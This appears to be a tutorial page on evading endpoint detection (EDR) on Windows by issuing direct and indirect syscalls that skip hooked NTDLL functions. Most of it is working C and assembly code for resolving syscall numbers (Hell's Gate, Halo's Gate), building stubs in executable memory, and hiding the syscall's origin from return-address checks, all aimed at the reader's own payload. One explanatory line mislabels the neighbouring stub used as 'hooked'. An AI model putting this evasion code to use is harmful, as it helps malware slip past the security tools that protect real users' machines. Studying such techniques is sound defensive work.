---
layout: page
title: "Direct Syscalls: Bypassing User-Mode Hooks Entirely"
---

# Direct Syscalls: Bypassing User-Mode Hooks Entirely

Unhooking restores NTDLL to its clean state by overwriting hook bytes with the original code. Direct syscalls take a different position: instead of restoring and then calling NTDLL, they skip NTDLL entirely. The syscall instruction is emitted directly from your code with the correct syscall number. Execution jumps straight from user space into the kernel. There is no NTDLL function to hook.

The difference matters. Unhooking requires reading NTDLL from disk, writing to executable memory, and making several API calls before the hooks are removed. Any of those calls can trigger detection. Direct syscalls require nothing from NTDLL at all, beyond knowing the syscall number.

## The Windows Syscall Mechanism

Every Windows kernel service is identified by a System Service Number (SSN). When a user-mode process calls a kernel function, it places the SSN in `eax`, places the argument pointer in `r10` (which mirrors `rcx` before the syscall clobbers it), and executes the `syscall` instruction. The CPU switches to kernel mode, the kernel dispatcher reads `eax`, and routes the call to the correct kernel routine.

The NTDLL stubs are wrappers around this mechanism:

```asm
; NtAllocateVirtualMemory stub in NTDLL (x64)
NtAllocateVirtualMemory:
    mov r10, rcx        ; save rcx (first argument) in r10
    mov eax, 0x18       ; SSN for NtAllocateVirtualMemory on this Windows version
    syscall             ; transition to kernel
    ret
```

The hook replaces the `mov r10, rcx` with a jump. Direct syscalls reproduce the stub without going through NTDLL. The SSN is the only piece of information needed from NTDLL.

## The SSN Problem

SSNs are not documented, not stable, and not consistent across Windows versions. `NtAllocateVirtualMemory` is `0x18` on some builds and a different number on others. Service packs, cumulative updates, and major version changes all shift SSNs.

Hardcoding SSNs breaks on any version that was not tested. The correct approach is to resolve SSNs at runtime from the NTDLL that is loaded in the process, the same one the EDR may have hooked.

## Hell's Gate: Reading SSNs from Memory

If NTDLL is not hooked, the SSN is readable directly from the function's bytes in memory. The stub always starts with `mov r10, rcx` (`4C 8B D1`) followed by `mov eax, <ssn>` (`B8 xx 00 00 00`). The SSN is at offset 4 from the function start.

```c
typedef NTSTATUS (NTAPI *NtFunc_t)(...);

DWORD get_ssn(const char *func_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    LPVOID  func  = GetProcAddress(ntdll, func_name);

    BYTE *bytes = (BYTE *)func;

    // Verify the stub starts with: mov r10, rcx (4C 8B D1)
    // followed by: mov eax, xx (B8 xx 00 00 00)
    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 &&
        bytes[3] == 0xB8) {
        return *(DWORD *)(bytes + 4);  // SSN is the next 4 bytes
    }

    // Function is hooked -- first bytes are not the expected stub
    return 0xFFFFFFFF;
}
```

If the first byte is `E9` (a jmp), the function is hooked and the SSN cannot be read from that address. This is where Hell's Gate fails and Halo's Gate takes over.

## Halo's Gate: SSN from Neighboring Stubs

NTDLL's syscall stubs are consecutive in SSN order in virtual memory. The export directory sorts functions alphabetically, but the stubs are physically laid out so that `NtAllocateVirtualMemory` at SSN `0x18` is immediately followed in memory by the stub at `0x19`, and so on.

If the target function is hooked, the neighboring stubs often are not. The correct approach is to sort all exported `Nt*` functions by their virtual address in the in-memory NTDLL, which gives the true adjacency and actual byte distances between stubs. Using a fixed stride like 32 bytes fails because NTDLL stubs are not uniformly sized across Windows versions.

```c
#include <windows.h>
#include <stdlib.h>

typedef struct {
    BYTE  *addr;
    DWORD  ssn;   // filled when stub is unhooked
    int    index; // position in address-sorted order
} STUB_ENTRY;

static int cmp_stub(const void *a, const void *b) {
    STUB_ENTRY *sa = (STUB_ENTRY *)a;
    STUB_ENTRY *sb = (STUB_ENTRY *)b;
    if (sa->addr < sb->addr) return -1;
    if (sa->addr > sb->addr) return  1;
    return 0;
}

// Returns TRUE if stub at addr is an unhooked syscall stub,
// and writes the SSN into *ssn_out.
static BOOL read_ssn(BYTE *addr, DWORD *ssn_out) {
    // Standard x64 syscall stub: 4C 8B D1 B8 <SSN> 0F 05 C3
    if (addr[0] == 0x4C && addr[1] == 0x8B &&
        addr[2] == 0xD1 && addr[3] == 0xB8) {
        *ssn_out = *(DWORD *)(addr + 4);
        return TRUE;
    }
    return FALSE;
}

DWORD get_ssn_halo(const char *func_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt  =
        (PIMAGE_NT_HEADERS)((BYTE *)ntdll + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp =
        (PIMAGE_EXPORT_DIRECTORY)((BYTE *)ntdll +
        nt->OptionalHeader.DataDirectory[0].VirtualAddress);

    PDWORD names = (PDWORD)((BYTE *)ntdll + exp->AddressOfNames);
    PWORD  ords  = (PWORD) ((BYTE *)ntdll + exp->AddressOfNameOrdinals);
    PDWORD funcs = (PDWORD)((BYTE *)ntdll + exp->AddressOfFunctions);

    // Collect all Nt* exports into an array
    DWORD      count = 0;
    STUB_ENTRY stubs[512] = {0};

    for (DWORD i = 0; i < exp->NumberOfNames && count < 512; i++) {
        const char *name = (const char *)((BYTE *)ntdll + names[i]);
        if (name[0] != 'N' || name[1] != 't') continue;
        stubs[count].addr = (BYTE *)ntdll + funcs[ords[i]];
        stubs[count].ssn  = 0xFFFFFFFF;
        count++;
    }

    // Sort by virtual address -- this gives true adjacency order
    qsort(stubs, count, sizeof(STUB_ENTRY), cmp_stub);

    // Assign index and fill SSNs where stub is unhooked
    BYTE *target_addr = (BYTE *)GetProcAddress(ntdll, func_name);
    int   target_idx  = -1;

    for (DWORD i = 0; i < count; i++) {
        stubs[i].index = (int)i;
        read_ssn(stubs[i].addr, &stubs[i].ssn);
        if (stubs[i].addr == target_addr)
            target_idx = (int)i;
    }

    if (target_idx < 0)
        return 0xFFFFFFFF;

    // If the target itself is unhooked, return its SSN directly
    if (stubs[target_idx].ssn != 0xFFFFFFFF)
        return stubs[target_idx].ssn;

    // Search outward from target_idx for the nearest unhooked neighbor
    for (int delta = 1; delta < (int)count; delta++) {
        int fwd = target_idx + delta;
        int bwd = target_idx - delta;

        if (fwd < (int)count && stubs[fwd].ssn != 0xFFFFFFFF)
            return stubs[fwd].ssn - (DWORD)delta;

        if (bwd >= 0 && stubs[bwd].ssn != 0xFFFFFFFF)
            return stubs[bwd].ssn + (DWORD)delta;
    }

    return 0xFFFFFFFF;
}
```

Sorting by address is the key correctness requirement. The SSN is the position of the stub in address order among all `Nt*` syscall stubs, which is exactly what the sorted index gives. A hooked neighbor at index `target_idx + delta` with SSN `N` means the target's SSN is `N - delta`.

## Writing the Syscall Stub

With the SSN resolved, the actual syscall is emitted in assembly. The stub takes the same arguments as the NTDLL function and calls the kernel directly.

In a MASM or NASM file compiled alongside the C code:

```asm
; direct_syscall.asm (x64 MASM syntax)
.code

; extern DWORD g_ssn_NtAllocVm -- SSN resolved at runtime by C code
extern g_ssn_NtAllocVm:DWORD

NtAllocateVirtualMemory_Direct PROC
    mov r10, rcx                       ; mirror rcx to r10 (syscall calling convention)
    mov eax, DWORD PTR [g_ssn_NtAllocVm]  ; load SSN value from memory
    syscall                            ; transition to kernel
    ret
NtAllocateVirtualMemory_Direct ENDP

END
```

The C side:

```c
DWORD g_ssn_NtAllocVm = 0;

// Declare the external asm stub
extern NTSTATUS NtAllocateVirtualMemory_Direct(
    HANDLE    ProcessHandle,
    PVOID    *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

void init_syscalls(void) {
    g_ssn_NtAllocVm = get_ssn_halo("NtAllocateVirtualMemory");
    // repeat for each required function
}

void use_direct_syscall(void) {
    init_syscalls();

    PVOID  base = NULL;
    SIZE_T size = 0x1000;

    NtAllocateVirtualMemory_Direct(
        (HANDLE)-1,   // current process
        &base,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
}
```

The stub executes in your code's `.text` section, not in NTDLL. The `syscall` instruction fires from an address that is inside your PE, not inside any DLL. The call reaches the kernel with no NTDLL involvement.

## Inline Stubs Without Assembly Files

Separate `.asm` files require a MASM or NASM toolchain. An alternative embeds the stub bytes directly in a C array and copies them into executable memory at runtime:

```c
// x64 syscall stub bytes:
// 4C 8B D1       mov r10, rcx
// B8 xx 00 00 00 mov eax, <ssn>
// 0F 05          syscall
// C3             ret

typedef NTSTATUS (*NtAllocVm_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

NtAllocVm_t build_syscall_stub(DWORD ssn) {
    BYTE template[] = {
        0x4C, 0x8B, 0xD1,          // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, <ssn> -- patched below
        0x0F, 0x05,                // syscall
        0xC3                       // ret
    };

    // Patch SSN into bytes 4-7
    *(DWORD *)(template + 4) = ssn;

    // Allocate executable memory for the stub
    BYTE *stub = VirtualAlloc(
        NULL, sizeof(template),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    memcpy(stub, template, sizeof(template));

    return (NtAllocVm_t)stub;
}
```

This creates a callable function pointer to a tiny stub in anonymous executable memory. Every syscall your code needs gets its own stub. There is no import from NTDLL, no hook to intercept, and no function call that routes through any monitored DLL.

## Egg Hunter Variant: Indirect Syscalls

A detectable property of direct syscalls is that the `syscall` instruction executes from an address inside your PE, not inside NTDLL. Some EDRs check the return address of kernel transitions: if `syscall` fired from an address that does not belong to any known legitimate module, it is anomalous.

Indirect syscalls address this by jumping into NTDLL to execute the `syscall` instruction there, while still controlling the SSN and bypassing the hook:

```asm
; Find the address of the `syscall` instruction inside the (possibly hooked) stub
; The hook only replaces the first bytes. The syscall instruction is still there,
; just unreachable through normal flow.

NtAllocateVirtualMemory_Indirect PROC
    mov r10, rcx
    mov eax, g_ssn_NtAllocVm
    jmp g_syscall_addr_NtAllocVm  ; jump into NTDLL at the syscall instruction
NtAllocateVirtualMemory_Indirect ENDP
```

```c
// Find the address of the `syscall` instruction within the hooked stub
LPVOID find_syscall_instruction(const char *func_name) {
    BYTE *func = (BYTE *)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), func_name
    );

    // The syscall instruction (0F 05) is typically at offset 8 in an
    // unhooked stub. In a hooked stub, scan forward for it.
    for (int i = 0; i < 64; i++) {
        if (func[i] == 0x0F && func[i+1] == 0x05)
            return (LPVOID)(func + i);
    }
    return NULL;
}
```

The `syscall` instruction executes at an address inside NTDLL, which passes the return-address check. The EDR hook at the function's entry point is never reached because the jump goes directly to the instruction that follows it.

## What Direct Syscalls Do Not Bypass

The kernel receives the call regardless of how `syscall` was issued. Every kernel callback registered by the EDR fires normally. `PsSetLoadImageNotifyRoutine` still notifies the EDR when a new image loads. `ObRegisterCallbacks` still intercepts handle operations. The kernel's own event tracing still logs the system call.

Direct syscalls eliminate the user-mode inspection layer. The telemetry layer that operates inside the kernel is a separate problem, addressed by ETW bypass.
